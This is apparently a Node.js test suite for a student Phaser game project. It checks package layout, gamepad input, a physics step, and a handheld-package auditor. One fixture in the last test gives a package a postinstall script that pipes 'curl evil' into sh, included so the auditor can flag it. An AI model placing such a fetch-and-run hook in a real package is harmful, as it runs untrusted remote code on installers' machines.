/**
 * Unit 19 Project Verification Suite (RED -> GREEN)
 * Run: node --test 0-student_files/projects/unit-19-phaser-jsgame/packaging.test.mjs
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { getInput, stepArcadeBody, auditPackageForHandheld } from './src/utils.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

test('Unit 19 project starter has flat ESM package.json, empty .jsg marker, and Phaser Scene source', () => {
  const markerPath = path.join(__dirname, 'arcade-quest.jsg');
  assert.equal(fs.existsSync(markerPath), true);
  assert.equal(fs.statSync(markerPath).size, 0);

  const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, 'package.json'), 'utf8'));
  assert.equal(pkg.type, 'module');
  assert.equal(pkg.main, 'dist/arcade-quest.js');

  const mainSource = fs.readFileSync(path.join(__dirname, 'src', 'main.js'), 'utf8');
  assert.match(mainSource, /extends Phaser\.Scene/);
  assert.match(mainSource, /getInput/);
});

test('getInput prioritizes connected standard/xbox gamepads before keyboard fallback', () => {
  const btn = (pressed) => ({ pressed, value: pressed ? 1 : 0 });
  const fakePad = {
    id: 'Anbernic Retro Gamepad',
    mapping: 'standard',
    buttons: [
      btn(true),  // 0: BUTTON_SOUTH
      btn(false), btn(false), btn(false),
      btn(false), btn(false), btn(false), btn(false),
      btn(false),
      btn(true),  // 9: START
      btn(false), btn(false),
      btn(false), btn(false),
      btn(true),  // 14: DPAD_LEFT
      btn(false),
    ],
  };

  const origDesc = Object.getOwnPropertyDescriptor(globalThis, 'navigator');
  Object.defineProperty(globalThis, 'navigator', {
    value: { getGamepads: () => [fakePad, null] },
    configurable: true,
  });
  try {
    const players = getInput();
    assert.equal(players.length, 2);
    assert.notEqual(players[0].type, 'keyboard');
    assert.equal(players[0].BUTTON_SOUTH.pressed, true);
    assert.equal(players[0].DPAD_LEFT.pressed, true);
    assert.equal(players[0].START.pressed, true);
    assert.equal(players[1].type, 'keyboard');
  } finally {
    Object.defineProperty(globalThis, 'navigator', origDesc);
  }
});

test('stepArcadeBody clamps deltaMs <= 50ms, integrates gravity, bounces & locks inside 640x480', () => {
  const world = { width: 640, height: 480 };
  const stepped = stepArcadeBody(
    {
      x: 610,
      y: 445,
      vx: 200,
      vy: 150,
      width: 40,
      height: 40,
      bounceX: 1,
      bounceY: 1,
      collideWorldBounds: true,
    },
    world,
    5000,
    200
  );

  assert.equal(stepped.x, 600);
  assert.equal(stepped.y, 440);
  assert.ok(stepped.vx < 0);
  assert.ok(stepped.vy < 0);
});

test('auditPackageForHandheld requires ESM, matching <name>.jsg marker, and warns on install scripts', () => {
  const clean = auditPackageForHandheld(
    { name: 'arcade-quest', type: 'module', main: 'dist/arcade-quest.js' },
    ['package.json', 'arcade-quest.jsg', 'dist/arcade-quest.js']
  );
  assert.equal(clean.ready, true);
  assert.deepEqual(clean.warnings, []);

  const risky = auditPackageForHandheld(
    { name: 'bad-game', type: 'commonjs', scripts: { postinstall: 'curl evil | sh' } },
    ['package.json']
  );
  assert.equal(risky.ready, false);
  assert.ok(risky.warnings.length >= 2);
});
